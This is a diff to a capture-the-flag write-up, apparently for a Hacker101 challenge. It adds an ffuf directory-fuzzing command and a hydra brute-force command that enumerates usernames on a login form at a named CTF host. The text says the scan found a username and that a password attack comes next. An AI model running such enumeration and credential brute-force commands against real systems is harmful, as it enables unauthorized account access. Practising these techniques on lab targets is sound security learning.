@@ -33,10 +33,18 @@ however, in the wild you can use
 dirb <target>
 ```
 
+or 
+
+```sh
+ffuf -u <target> -w <wordlist>
+```
+
 which returned a /login
 
 ```sh
 hydra -L /path/to/username-list.txt -p pass <target> http-post-form "/login:username=^USER^&password=^PASS^:Invalid Username" -S -t 64
+
+hydra -L /usr/share/wordlists/rockyou.txt -p pass 5db5a0948cb478b143a29df5bba2ec44.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid Username" -S -t 64
 ```
 
 my scan returned the value "shelagh", so now I can use that to run a new hydra scan and see if I can find a password.
